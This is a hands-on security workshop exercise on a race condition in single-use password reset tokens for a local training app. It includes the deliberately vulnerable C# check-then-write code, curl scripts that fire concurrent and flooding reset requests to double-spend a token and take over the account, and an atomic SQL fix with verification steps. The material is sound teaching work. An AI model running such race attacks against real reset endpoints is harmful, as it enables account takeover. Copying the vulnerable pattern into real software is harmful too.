# Exercise 07 — Race Conditions: Password Reset Token

**Difficulty:** Intermediate  
**Category:** Race Conditions / TOCTOU  
**OWASP Top 10:** A07:2021 — Identification and Authentication Failures

---

## Scenario

The password reset flow issues a single-use token. The token invalidation is implemented as check-then-mark: the server reads the token, confirms `UsedAt IS NULL`, waits (simulating real-world I/O), then marks it used and updates the password. Two concurrent requests with the same token can both pass the check before either writes — allowing an attacker who intercepts one reset token to use it twice: setting the password to one they control and locking the victim out.

---

## Background

Password reset tokens are a high-value target: a single stolen token can grant account takeover. The TOCTOU pattern is especially dangerous here because:

- The token is often transmitted over insecure channels (email, SMS)
- The race window can persist for hundreds of milliseconds in real implementations
- The victim does not know the token has been double-consumed — both write operations succeed silently

---

## Step 1 — Request a reset token via the UI

> **Note:** The forgot-password and reset-password endpoints are public — no login cookie is needed to call them.

On the login page at `http://localhost:5173`, click **Forgot password?**. Enter `partner` and submit. The page displays the reset token directly (workshop mode — production would send it by email):

```
Reset token: a3f8c1d2e9b04f67...
```

Copy the token. Now open the reset link that would normally be in the email — navigate to:

```
http://localhost:5173/reset-password
```

Enter the token and a new password, then submit. This is the normal single-use flow. The vulnerability becomes apparent when two requests use the same token concurrently — which requires the curl steps below.

To request a token via curl:

```bash
curl -s -X POST http://localhost:5001/bff/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"username":"partner"}' | jq .
```

Expected response (workshop returns the token directly — production would email it):

```json
{
  "message": "Reset token issued (workshop: token returned in response, not emailed)",
  "resetToken": "a3f8c1d2e9b04f67...",
  "expiresAt": "2026-05-07T14:00:00Z"
}
```

Save the token:

```bash
TOKEN="a3f8c1d2e9b04f67..."
```

---

## Step 2 — Observe normal single-use behaviour

```bash
# First use — succeeds
curl -s -X POST http://localhost:5001/bff/auth/reset-password \
  -H "Content-Type: application/json" \
  -d "$(printf '{"token":"%s","newPassword":"NewPass1234!"}' "$TOKEN")" | jq .

# Second use with the same token — rejected
curl -s -X POST http://localhost:5001/bff/auth/reset-password \
  -H "Content-Type: application/json" \
  -d "$(printf '{"token":"%s","newPassword":"AnotherPass!"}' "$TOKEN")" | jq .
```

Expected: first returns `200 OK`, second returns `400 Bad Request`:

```json
{ "message": "Invalid or expired reset token" }
```

Restore the partner password before continuing:

```bash
TOKEN=$(curl -s -X POST http://localhost:5001/bff/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"username":"partner"}' | jq -r '.resetToken')

curl -s -X POST http://localhost:5001/bff/auth/reset-password \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$TOKEN\",\"newPassword\":\"Partner1234!\"}" | jq .
```

---

## Step 3 — Understand the vulnerable code

A vulnerable implementation uses check-then-write:

```csharp
// VULNERABLE — TOCTOU
// Time of Check
var token = await _db.PasswordResetTokens.Include(t => t.User)
    .FirstOrDefaultAsync(t => t.Token == request.Token
                           && t.UsedAt == null
                           && t.ExpiresAt > now);
if (token == null)
    return BadRequest("Invalid or expired reset token");

// Race window — real I/O latency in production (500 ms shown for clarity)
await Task.Delay(500);

// Time of Use — another request may have already set UsedAt
token.UsedAt = DateTime.UtcNow;
token.User.PasswordHash = BCrypt.Net.BCrypt.HashPassword(request.NewPassword);
await _db.SaveChangesAsync();
```

The window between reading `UsedAt IS NULL` and writing `UsedAt = now` is the race window. Both concurrent requests read `UsedAt = null`, both pass, and both write — last writer wins the password.

---

## Step 4 — Exploit the race

Get a fresh token, then send two concurrent requests with different passwords before either marks the token used:

```bash
TOKEN=$(curl -s -X POST http://localhost:5001/bff/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"username":"partner"}' | jq -r '.resetToken')

echo "Token: $TOKEN"

curl -s -X POST http://localhost:5001/bff/auth/reset-password \
  -H "Content-Type: application/json" \
  -d "$(printf '{"token":"%s","newPassword":"Attacker1234!"}' "$TOKEN")" | jq . &

curl -s -X POST http://localhost:5001/bff/auth/reset-password \
  -H "Content-Type: application/json" \
  -d "$(printf '{"token":"%s","newPassword":"Victim5678!"}' "$TOKEN")" | jq . &

wait
```

Expected: **both** return `200 OK` — the token was consumed twice.

Verify which password won (whichever write landed last):

```bash
# Try attacker password
curl -s -X POST http://localhost:5001/bff/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"partner","password":"Attacker1234!"}' | jq -r '.username // "WRONG"'

# Try victim password
curl -s -X POST http://localhost:5001/bff/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"partner","password":"Victim5678!"}' | jq -r '.username // "WRONG"'
```

One will print `partner`, the other `WRONG`. The result is non-deterministic — whichever write lands last wins. If the victim's password wins this round, the attacker lost this attempt. In a real attack the attacker retries with more parallelism to increase the odds their write lands last.

**Increasing the odds — flood with attacker writes:**

Request a fresh token and send many concurrent attacker writes alongside one victim write. The more attacker requests, the higher the chance one lands last:

```bash
TOKEN=$(curl -s -X POST http://localhost:5001/bff/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"username":"partner"}' | jq -r '.resetToken')

# Victim resets their password (one request)
curl -s -X POST http://localhost:5001/bff/auth/reset-password \
  -H "Content-Type: application/json" \
  -d "$(printf '{"token":"%s","newPassword":"Victim5678!"}' "$TOKEN")" > /dev/null &

# Attacker floods with 10 concurrent writes using the same token
for i in $(seq 1 10); do
  curl -s -X POST http://localhost:5001/bff/auth/reset-password \
    -H "Content-Type: application/json" \
    -d "$(printf '{"token":"%s","newPassword":"Attacker1234!"}' "$TOKEN")" > /dev/null &
done
wait

# Check if attacker won
curl -s -X POST http://localhost:5001/bff/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"partner","password":"Attacker1234!"}' | jq -r '.username // "lost — retry"'
```

With 10 attacker writes to 1 victim write, the attacker wins the majority of the time. The victim's account is locked out with a password they never set.

Restore the account before moving on:

```bash
TOKEN=$(curl -s -X POST http://localhost:5001/bff/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"username":"partner"}' | jq -r '.resetToken')

curl -s -X POST http://localhost:5001/bff/auth/reset-password \
  -H "Content-Type: application/json" \
  -d "$(printf '{"token":"%s","newPassword":"Partner1234!"}' "$TOKEN")" | jq .
```

---

## Step 5 — How it works at runtime

```
POST /bff/auth/reset-password (×2 concurrent, same token)
        │
        ├─ Without the fix (TOCTOU)
        │       │
        │  Req 1: reads UsedAt=NULL → token valid → check passes
        │  Req 2: reads UsedAt=NULL → token valid → check passes   ← both pass simultaneously
        │       │
        │  [500ms race window — both requests are asleep here]
        │       │
        │  Req 1: sets UsedAt=now, sets password="Attacker1234!" → SaveChanges
        │  Req 2: sets UsedAt=now, sets password="Victim5678!"   → SaveChanges
        │       │
        │       └─► both return 200 OK — last write wins the password
        │           victim's account locked out with attacker-chosen password
        │
        └─ With the fix: atomic UPDATE in DB
                │
                ▼
           UPDATE PasswordResetTokens SET UsedAt = @now
           WHERE Token = @token AND UsedAt IS NULL AND ExpiresAt > @now
                │
                ├─ Req 1 wins: 1 row affected → password updated → 200 OK
                └─ Req 2 loses: 0 rows affected → 409 Conflict, password unchanged
```

## Step 6 — Apply the fix

**File:** `src/BookingDojo.Api/Controllers/PasswordResetController.cs`  
**Method:** `ResetPassword`

**Remove** the vulnerable block:

```csharp
// VULNERABLE PATH (TOCTOU race condition)
// Time of Check: read and validate the token
var token = await _db.PasswordResetTokens
    .Include(t => t.User)
    .FirstOrDefaultAsync(t => t.Token == request.Token
                           && t.UsedAt == null
                           && t.ExpiresAt > now);

if (token == null)
    return BadRequest(new { message = "Invalid or expired reset token" });

// Race window
await Task.Delay(500);

// Time of Use: mark used and update password
token.UsedAt = DateTime.UtcNow;
token.User.PasswordHash = BCrypt.Net.BCrypt.HashPassword(request.NewPassword);
await _db.SaveChangesAsync();

return Ok(new { message = "Password reset successfully" });
```

**Replace with:**

```csharp
// Atomic claim: only the first concurrent request satisfies UsedAt IS NULL.
var markedAt = DateTime.UtcNow;
var rows = await _db.Database.ExecuteSqlRawAsync(
    "UPDATE bookingdojo.\"PasswordResetTokens\" " +
    "SET \"UsedAt\" = {0} " +
    "WHERE \"Token\" = {1} AND \"UsedAt\" IS NULL AND \"ExpiresAt\" > {2}",
    markedAt, request.Token, now);

if (rows == 0)
    return Conflict(new { message = "Invalid, expired, or already-used reset token" });

// Claim succeeded — load the user and update the password.
var tokenRecord = await _db.PasswordResetTokens
    .Include(t => t.User)
    .FirstOrDefaultAsync(t => t.Token == request.Token);

tokenRecord!.User.PasswordHash = BCrypt.Net.BCrypt.HashPassword(request.NewPassword);
await _db.SaveChangesAsync();

return Ok(new { message = "Password reset successfully" });
```

The `UPDATE ... WHERE UsedAt IS NULL` is a single atomic statement. Both concurrent requests race to execute it. The database only marks the token used once — whichever request gets there first sees `1 row affected`; the other sees `0 rows affected` and returns 409. The password update only runs after the atomic claim succeeds.

---

## Step 7 — Verify

Request a fresh token and fire two concurrent resets with different passwords:

```bash
TOKEN=$(curl -s -X POST http://localhost:5001/bff/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"username":"partner"}' | jq -r '.resetToken')

curl -s -X POST http://localhost:5001/bff/auth/reset-password \
  -H "Content-Type: application/json" \
  -d "$(printf '{"token":"%s","newPassword":"Attacker1234!"}' "$TOKEN")" | jq . &

curl -s -X POST http://localhost:5001/bff/auth/reset-password \
  -H "Content-Type: application/json" \
  -d "$(printf '{"token":"%s","newPassword":"Victim5678!"}' "$TOKEN")" | jq . &

wait
```

Expected: exactly **one `200 OK`** and **one `409 Conflict`** — only one write went through.

Restore the password before continuing:

```bash
TOKEN=$(curl -s -X POST http://localhost:5001/bff/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"username":"partner"}' | jq -r '.resetToken')

curl -s -X POST http://localhost:5001/bff/auth/reset-password \
  -H "Content-Type: application/json" \
  -d "$(printf '{"token":"%s","newPassword":"Partner1234!"}' "$TOKEN")" | jq .
```

---

## Step 8 — Discussion

| Control | Protection |
|---------|-----------|
| Atomic UPDATE WHERE UsedAt IS NULL | Closes the race window at the DB layer |
| Short token expiry (< 15 min) | Limits interception opportunity |
| One active token per user | Invalidating old tokens on new request (already implemented) |
| Rate limiting on reset endpoint | Prevents brute-force of token space |
| Secure token delivery (signed email link) | Reduces interception risk |

---

## Key Takeaways

- **Single-use does not mean atomic.** Checking `UsedAt IS NULL` then writing it are two operations; between them the same token can be validated by a second request.
- **Email delivery widens the window.** In production the race window is not 500 ms — it can be minutes while the victim opens their inbox. More time means more retries for the attacker.
- **The fix is a WHERE clause.** One line of SQL closes the race at zero cost to performance.

---

## Further Reading

- [OWASP A07:2021 — Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- [CWE-362 — Race Condition](https://cwe.mitre.org/data/definitions/362.html)
- [OWASP Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)
